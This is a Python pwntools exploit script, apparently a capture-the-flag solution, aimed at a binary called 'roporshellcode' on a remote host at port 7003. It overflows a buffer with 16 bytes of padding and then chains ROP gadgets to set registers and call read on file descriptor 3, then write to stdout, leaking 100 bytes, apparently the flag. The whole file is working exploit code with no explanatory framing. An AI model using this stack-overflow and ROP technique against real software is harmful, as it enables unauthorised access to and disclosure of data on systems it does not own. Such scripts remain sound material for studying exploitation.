from pwn import *

context.arch = 'amd64'
elf = ELF('./roporshellcode')  # Load the target binary

# Set up remote or local debugging environment
if args.R:
    p = remote('lmao.lol', 7003)
elif args.H:
    p = process('./roporshellcode')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./roporshellcode',
                  gdbscript='''
                      b *main
                      c
                      ''')

xor_rdx = 0x00000000004011bf  # xor rdx, rdx; ret
inc_rdx = 0x00000000004011cf  # add rdx, 1; ret
mov_rax_rdi_from_rdx = 0x00000000004011d4  # mov rax, rdx; mov rdi, rdx; ret
inc_rdi = 0x00000000004011db  # inc rdi; ret
syscall = 0x00000000004011c3  # syscall; ret
# Construct the ROP chain
rop_chain = []
# XOR RAX RAX
rop_chain.append(xor_rdx)
rop_chain.append(mov_rax_rdi_from_rdx)  # Move RDX (0) to RAX and RDI
# MOV RDI, 3
rop_chain += [inc_rdi] * 3  # Increment RDI to 3
# MOV RDX, 100
rop_chain += [inc_rdx] * 100  # Increment RDX to 100
# SYSCALL
rop_chain.append(syscall)
# MOV RAX, 1;MOV RDI,1
rop_chain.append(xor_rdx)  # Clear RDX
rop_chain.append(inc_rdx)  # Move RDX (0) to RAX
rop_chain.append(mov_rax_rdi_from_rdx)  # Set RAX to 1 (write syscall)
# MOV RDX, 100
rop_chain += [inc_rdx] * 99  # Increment RDX to 100
# SYSCALL
rop_chain.append(syscall)  # Trigger the syscall to write

# Construct the final payload
payload = b"A" * 16
payload += b"".join(p64(r) for r in rop_chain)

# Send the payload and interact
p.sendline(payload)
p.interactive()
